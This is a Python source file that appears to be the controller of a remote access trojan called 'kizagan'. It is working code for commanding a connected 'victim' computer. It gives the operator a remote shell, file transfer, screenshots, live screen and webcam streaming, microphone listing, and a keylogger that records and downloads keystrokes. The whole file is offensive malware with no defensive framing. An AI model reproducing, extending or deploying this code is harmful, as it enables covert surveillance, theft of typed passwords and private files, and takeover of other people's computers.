import socket
import json
from progress.bar import IncrementalBar
from halo import Halo
from colorama import init, Fore
import os
from datetime import datetime
import cv2
import pickle
from pynput.keyboard import Listener
import threading

init()


class Server():
    def __init__(self, connection, addr, host_name, key_state):
        self.connection = connection
        self.addr = addr
        self.host_name = host_name
        self.key_state = key_state

    def on_press(self, key):
        key = str(key)
        self.key = key.replace("'", "")

    def start_interrupt_listener(self):
        with Listener(on_press=self.on_press) as self.interrupt_listener:
            self.interrupt_listener.join()

    def stop_interrupt_listener(self):
        self.interrupt_listener_thread.stop()

    def exec_cmd(self, command):
        self.connection.send(command.encode())
        shell_command_output_with_length = self.connection.recv(1024).decode()
        if shell_command_output_with_length == "command_execute_error":
            return f"{Fore.RED}[-]Command executing failed.Maybe you executed wrong command."
        else:
            shell_command_output_delimiter = shell_command_output_with_length.split(":shell_delimiter:")
            shell_command_output_length = int(shell_command_output_delimiter[0])
            shell_command_received_bytes = len(shell_command_output_delimiter[1])
            if shell_command_output_length <= 1020:
                return Fore.GREEN+shell_command_output_delimiter[1]
            else:
                shell_command_output = shell_command_output_delimiter[1]
                while shell_command_received_bytes < shell_command_output_length:
                    received_str = self.connection.recv(1024).decode()
                    shell_command_output = shell_command_output + received_str
                    shell_command_received_bytes = shell_command_received_bytes + len(received_str)
                return Fore.GREEN+shell_command_output
            
    def create_file_name(self, operation, file_n=None):
        date = datetime.now()
        if not os.name == "nt":
            if operation == "screenshot":
                file_name = f"downloads/screenshots/{date.day}.{date.month}.{date.year}_{date.hour}:{date.minute}:{date.second}_screenshot.png"
            elif operation == "camera snapshot":
                file_name = f"downloads/camera_snapshots/{date.day}.{date.month}.{date.year}_{date.hour}:{date.minute}:{date.second}_camera_snapshot.png"
            elif operation == "keystroke":
                file_name = f"downloads/keystrokes/{date.day}.{date.month}.{date.year}_{date.hour}:{date.minute}:{date.second}_keystroke.txt"
            else:
                file_name = f"downloads/{file_n}"
        else:
            if operation == "screenshot":
                file_name = f"downloads\\screenshots\\{date.day}.{date.month}.{date.year}_{date.hour}_{date.minute}_{date.second}_screenshot.png"
            elif operation == "camera snapshot":
                file_name = f"downloads\\camera_snapshots\\{date.day}.{date.month}.{date.year}_{date.hour}_{date.minute}_{date.second}_camera_snapshot.png"
            elif operation == "keystroke":
                file_name = f"downloads\\keystrokes\\{date.day}.{date.month}.{date.year}_{date.hour}_{date.minute}_{date.second}_keystroke.txt"
            else:
                file_name = f"downloads\\{file_n}"

        return file_name
    
    def download_file(self, file, operation):   # file = downloads/a1.png || downloads/screenshots/victim.png
        if operation == "screenshot" or operation == "camera snapshot" or operation == "keystroke":
            spinner = Halo(text=f"Getting {operation}", spinner="line", placement="right", color="green", text_color="green")
            spinner.start()
            client_output = self.connection.recv(1024).decode()
            if client_output == "ss_success" or client_output == "camera_success" or client_output == "key_success":
                spinner.succeed(f"{operation} taken successfully!") # duzenleme gerekiyor...
                bar = IncrementalBar(f"Downloading {operation}", suffix='%(percent).1f%% - Elapsed Time:%(elapsed)ds - ETA:%(eta)ds')
            else:
                spinner.fail(text=f"{operation} can't be taken.")
                return Fore.RED+"[-]An error occured on client."
        else:
            bar = IncrementalBar(f"Downloading {file}", suffix='%(percent).1f%% - Elapsed Time:%(elapsed)ds - ETA:%(eta)ds')
        file_size = self.connection.recv(1024).decode()
        if file_size == "download_error":
            return Fore.RED+f"\n[-]File downloading failed.An error occured on client."
        file_size = int(file_size)
        if (file.find("/") != -1 or file.find("\\") != -1) and operation == "download":
            if os.name == "nt":
                file_name = file.split("\\")[-1]
                downloaded_file = open(f"downloads\\{file_name}", "wb")
            else:
                file_name = file.split("/")[-1]
                downloaded_file = open(f"downloads/{file_name}", "wb")
        else:
            downloaded_file = open(self.create_file_name(operation, file), "wb")
        file_content = self.connection.recv(1024)
        received_bytes = len(file_content)
        bar.next((received_bytes/file_size)*100)
        while file_content:
            downloaded_file.write(file_content)
            if file_size > received_bytes:
                file_content = self.connection.recv(1024)
                received_bytes = received_bytes + len(file_content)
                bar.next((len(file_content)/file_size)*100)
            else:
                downloaded_file.close()
                if operation == "screenshot" or operation == "camera snapshot" or operation == "keystroke":
                    return Fore.LIGHTGREEN_EX+f"\n[+]{operation} downloaded successfully."
                else:
                    return Fore.LIGHTGREEN_EX+f"\n[+]{file} downloaded successfully."
                    
    def upload_file(self, file, upload_path):
        bar = IncrementalBar(f"Uploading {file}", suffix='%(percent).1f%% - Elapsed Time:%(elapsed)ds - ETA:%(eta)ds')
        try:
            file_ = open(file, "rb")
        except:
            self.connection.send("upload_error".encode())
            return Fore.RED+f"[-]{file} not found."
        file_size = len(file_.read())
        file_.close()
        file_ = open(file, "rb")
        self.connection.send(str(file_size).encode())
        upload_path_output = self.connection.recv(1024).decode()
        if upload_path_output == "upload_path_error":
            return Fore.RED+f"[-]{upload_path} not found on client or you don't have permissions.Please enter a valid path."
        file_content = file_.read(1024)
        while file_content:
            sent_bytes = len(file_content)
            bar.next((sent_bytes/file_size)*100)
            self.connection.send(file_content)
            file_content = file_.read(1024)
        file_.close()
        return Fore.LIGHTGREEN_EX+f"\n[+]{file} uploaded successfully."
    
    def cam_stream(self):
        print(Fore.BLUE+"[!]Camera streaming started.Press 'k' to stop it.")
        self.key = ""
        interrupt_listener_thread = threading.Thread(target=self.start_interrupt_listener)
        interrupt_listener_thread.start()
        while True:
            try:
                img_size = self.connection.recv(1024).decode()
                if img_size == "camera_error":
                    return Fore.RED+"[-]Please enter a valid camera index."
                img_size = int(img_size)
                self.connection.send("get_size".encode())
                img = self.connection.recv(1024)
                img_content = img
                received_bytes = len(img)
                while img:
                    if img_size > received_bytes:
                        img = self.connection.recv(1024)
                        img_content = img_content + img
                        received_bytes = received_bytes + len(img)
                    else:
                        loaded_img = pickle.loads(img_content)
                        cv2.imshow(f"CAMERA {self.host_name}@{self.addr[0]}:{self.addr[1]}", loaded_img)
                        cv2.waitKey(10)
                        self.connection.send("get_img".encode())
                        break
                if self.key == "k":
                    self.interrupt_listener.stop()
                    raise KeyboardInterrupt
            except KeyboardInterrupt:
                self.connection.recv(1048576)
                self.connection.send("cam_stop".encode())
                cv2.destroyAllWindows()
                return Fore.LIGHTGREEN_EX+"[+]Camera streaming stopped."
            
    def screen_stream(self):
        print(Fore.BLUE+"[!]Screen streaming started.Press 'k' to stop it.")
        self.key = ""
        interrupt_listener_thread = threading.Thread(target=self.start_interrupt_listener)
        interrupt_listener_thread.start()
        while True:
            try:
                frame_size = self.connection.recv(1024).decode()
                if frame_size == "screen_error":
                    return Fore.RED+"[-]Screen streaming failed."
                frame_size = int(frame_size)
                self.connection.send("get_size".encode())
                frame = self.connection.recv(1024)
                frame_content = frame
                received_bytes = len(frame)
                while frame:
                    if frame_size > received_bytes:
                        frame = self.connection.recv(1024)
                        frame_content = frame_content + frame
                        received_bytes = received_bytes + len(frame)
                    else:
                        loaded_frame = pickle.loads(frame_content)
                        cv2.imshow(f"SCREEN {self.host_name}@{self.addr[0]}:{self.addr[1]}", loaded_frame)
                        cv2.waitKey(10)
                        self.connection.send("get_frame".encode())
                        break
                if self.key == "k":
                    self.interrupt_listener.stop()
                    raise KeyboardInterrupt
            except KeyboardInterrupt:
                self.connection.recv(1048576)
                self.connection.send("screen_stop".encode())
                cv2.destroyAllWindows()
                return Fore.LIGHTGREEN_EX+"[+]Screen streaming stopped."

    def shell(self):
        self.terminal_state = "shell_terminal"
        self.connection.send("shell".encode())
        current_path = self.connection.recv(1024).decode()
        print(f"{Fore.CYAN}[?]Welcome to the victim's shell terminal.Enter 'help' to show command list.\n")
        while True:
            try:
                s_command = input(f"{Fore.CYAN}┌──────({Fore.RED}shell@{self.host_name}{Fore.CYAN}) - [{Fore.LIGHTGREEN_EX}{current_path}{Fore.CYAN}]\n└───{Fore.BLUE}$ {Fore.GREEN}")
                splitted_s_command = s_command.split(" ")
                if s_command == "exit":
                    self.connection.send("exit".encode())
                    self.terminal_state = "kizagan_terminal"
                    return 0
                elif splitted_s_command[0] == "help":
                    print(self.help(self.terminal_state, splitted_s_command[1])) if len(splitted_s_command) > 1 else print(self.help(self.terminal_state))
                elif s_command == "clear":
                    os.system("cls") if os.name == "nt" else os.system("clear")
                elif splitted_s_command[0] == "cd":
                    if len(splitted_s_command) > 1:
                        self.connection.send(s_command.encode())
                        cd_output = self.connection.recv(1024).decode()
                        cd_output = cd_output.split(":cd_delimiter:")
                        if cd_output[0] == "cd_success":
                            current_path = cd_output[1]
                            print(f"{Fore.LIGHTGREEN_EX}[+]Directory changed :{splitted_s_command[1]}")
                        else:
                            print(f"{Fore.RED}[-]Directory changing failed.Maybe you entered wrong path.")
                    else:
                        print(f"{Fore.RED}[-]Directory changing failed.Please enter a path.Usage: cd <path>")
                elif s_command == "pwd":
                    self.connection.send(s_command.encode())
                    pwd_output = self.connection.recv(1024).decode()
                    print(f"{Fore.RED}[-]Pwd failed.") if pwd_output == "pwd_error" else print(Fore.LIGHTGREEN_EX+pwd_output)
                elif splitted_s_command[0] == "mkdir":
                    if len(splitted_s_command) > 1:
                        self.connection.send(s_command.encode())
                        mkdir_output = self.connection.recv(1024).decode()
                        print(f"{Fore.LIGHTGREEN_EX}[+]Directory created :{splitted_s_command[1]}") if mkdir_output == "mkdir_success" else print(f"{Fore.RED}[-]Directory creating failed.Maybe you entered a directory already exists.")
                    else:
                        print(f"{Fore.RED}[-]Directory creating failed.Please enter a directory name.Usage: mkdir <directory_name>")
                elif splitted_s_command[0] == "rmdir":
                    if len(splitted_s_command) > 1:
                        self.connection.send(s_command.encode())
                        rmdir_output = self.connection.recv(1024).decode()
                        print(f"{Fore.LIGHTGREEN_EX}[+]Directory removed :{splitted_s_command[1]}") if rmdir_output == "rmdir_success" else print(f"{Fore.RED}[-]Directory removing failed.Maybe you entered a directory not exists.")
                    else:
                        print(f"{Fore.RED}[-]Directory removing failed.Please enter a directory name.Usage: rmdir <directory_name>")
                elif splitted_s_command[0] == "rm":
                    if len(splitted_s_command) > 1:
                        self.connection.send(s_command.encode())
                        rm_output = self.connection.recv(1024).decode()
                        print(f"{Fore.LIGHTGREEN_EX}[+]File removed :{splitted_s_command[1]}") if rm_output == "rm_success" else print(f"{Fore.RED}[-]File removing failed.Maybe you entered a file not exists.")
                    else:
                        print(f"{Fore.RED}[-]File removing failed.Please enter a file name.Usage: rm <file_name>")
                elif splitted_s_command[0] == "rename":
                    if len(splitted_s_command) > 2:
                        self.connection.send(s_command.encode())
                        rename_output = self.connection.recv(1024).decode()
                        print(f"{Fore.LIGHTGREEN_EX}[+]Renamed :{splitted_s_command[1]} -----> {splitted_s_command[2]}") if rename_output == "rename_success" else print(f"{Fore.RED}[-]Renaming failed.Maybe you entered a directory/file not exists.")
                    else:
                        print(f"{Fore.RED}[-]Renaming failed.Please enter a directory/file name.Usage: rename <source_name> <new_name>")
                elif splitted_s_command[0] == "download":
                    if len(splitted_s_command) > 1:
                        self.connection.send(s_command.encode())
                        download_output = self.download_file(splitted_s_command[1], "download")
                        print(download_output)
                    else:
                        print(f"{Fore.RED}[-]File downloading failed.Please enter a file to download.Usage: download <file_name>")
                elif splitted_s_command[0] == "upload":
                    if len(splitted_s_command) > 1:
                        if len(splitted_s_command) > 2:
                            self.connection.send(s_command.encode())
                            upload_output = self.upload_file(splitted_s_command[1], splitted_s_command[2])
                            print(upload_output)
                        else:
                            if os.name == "nt":
                                file = (splitted_s_command[1].split("\\"))[-1]
                            else:
                                file = (splitted_s_command[1].split("/"))[-1]
                            s_command = s_command + f" {file}"
                            self.connection.send(s_command.encode())
                            upload_output = self.upload_file(splitted_s_command[1], file)
                            print(upload_output)
                    else:
                        print(f"{Fore.RED}[-]File uploading failed.Please enter a file to upload.Usage: upload <file_name> <location_path_of_client>")
                else:
                    shell_command_output = self.exec_cmd(s_command)
                    print(shell_command_output)
            except KeyboardInterrupt:
                print(f"{Fore.CYAN}[!]CTRL+C detected.Exiting from shell terminal...")
                self.connection.send("exit".encode())
                return 0
        
    def help(self, terminal_state, command=None):
        if not os.name == "nt":
            help_file = open("json/kizagan_help.json", "r")
        else:
            help_file = open("json\\kizagan_help.json", "r")
        json_ = help_file.read()
        help_file.close()
        parsed_json = json.loads(json_)
        terminal_help_object = f"{terminal_state}_help"
        if command == None:
            splitted_parse = (parsed_json[terminal_help_object]["commands"]).split(":.:")
            return f"{Fore.LIGHTCYAN_EX}{splitted_parse[0]}{Fore.GREEN}{splitted_parse[1]}"
        else:
            try:
                if command == "all":
                    help_output = ""
                    for i in parsed_json[terminal_help_object]["detailed_commands"]:
                        splitted_parse = (parsed_json[terminal_help_object]["detailed_commands"][i]).split(":.:")
                        help_output = help_output + Fore.LIGHTCYAN_EX + splitted_parse[0] + Fore.GREEN + splitted_parse[1] + "\n\n"
                    return help_output
                else:
                    splitted_parse = (parsed_json[terminal_help_object]["detailed_commands"][command]).split(":.:")
                    return f"{Fore.LIGHTCYAN_EX}{splitted_parse[0]}{Fore.GREEN}{splitted_parse[1]}"
            except KeyError:
                return f"{Fore.RED}[-]No command found named with {command}."
    
    def main(self):
        self.terminal_state = "kizagan_terminal"
        print(f"{Fore.CYAN}[?]Welcome to the kizagan terminal.Enter 'help' to show command list.\n")
        while True:
            try:
                k_command = input(f"{Fore.BLUE}┌──────({Fore.LIGHTGREEN_EX}{self.host_name}@{self.addr[0]}{Fore.BLUE})\n└───{Fore.RED}$ {Fore.GREEN}")
                splitted_k_command = k_command.split(" ")
                if k_command == "shell":
                    self.shell()
                    print(f"{Fore.BLUE}[?]Welcome to the kizagan terminal.Enter 'help' to show command list.\n")
                elif k_command == "screen_shot":
                    self.connection.send("screen_shot".encode())
                    print(self.download_file("", "screenshot"))
                elif k_command == "screen_stream":
                    self.connection.send("screen_stream".encode())
                    print(self.screen_stream())
                elif k_command == "cam_list":
                    self.connection.send("cam_list".encode())
                    cam_list = self.connection.recv(1024).decode()
                    print(Fore.LIGHTGREEN_EX+cam_list)
                elif splitted_k_command[0] == "cam_snapshot":
                    if len(splitted_k_command) > 1:
                        self.connection.send(k_command.encode())
                        print(self.download_file("", "camera snapshot"))
                    else:
                        print(f"{Fore.RED}[-]Please enter a camera index.You can learn camera index with 'cam_list' command.\nUsage: camera_snapshot <camera_index>")
                elif splitted_k_command[0] == "cam_stream":
                    if len(splitted_k_command) > 1:
                        self.connection.send(k_command.encode())
                        print(self.cam_stream())
                    else:
                        print(f"{Fore.RED}[-]Please enter a camera index.You can learn camera index with 'cam_list' command.\nUsage: camera_snapshot <camera_index>")
                elif k_command == "mic_list":
                    self.connection.send("mic_list".encode())
                    mic_list = self.connection.recv(1024).decode()
                    print(Fore.LIGHTGREEN_EX+mic_list)
                elif k_command == "keystroke_start":
                    if self.key_state == "false":
                        self.connection.send("start_key".encode())
                        self.key_state = "true"
                        print(f"{Fore.LIGHTGREEN_EX}[+]Keystroke activated.")
                    else:
                        print(f"{Fore.BLUE}[!]Key stroke already activated.")
                elif k_command == "keystroke_stop":
                    if self.key_state == "true":
                        self.connection.send("stop_key".encode())
                        self.key_state = "false"
                        print(f"{Fore.LIGHTGREEN_EX}[+]Keystroke deactivated.")
                    else:
                        print(f"{Fore.BLUE}[+]Key stroke already deactivated.")
                elif k_command == "keystroke_get":
                    self.connection.send("get_key".encode())
                    print(self.download_file("", "keystroke"))
                elif k_command == "clear":
                    os.system("cls") if os.name == "nt" else os.system("clear")
                elif k_command == "exit":
                    self.connection.send("exit".encode())
                    return 0
                elif splitted_k_command[0] == "help":
                    print(self.help(self.terminal_state, splitted_k_command[1])) if len(splitted_k_command) > 1 else print(self.help(self.terminal_state))                        
                else:
                    print(f"{Fore.RED}[-]Unknown command.Enter 'help' to show command list.")
            
            except KeyboardInterrupt:
                print(f"{Fore.CYAN}[!]CTRL+C detected.Exiting...")
                self.connection.send("exit".encode())
                return 0
            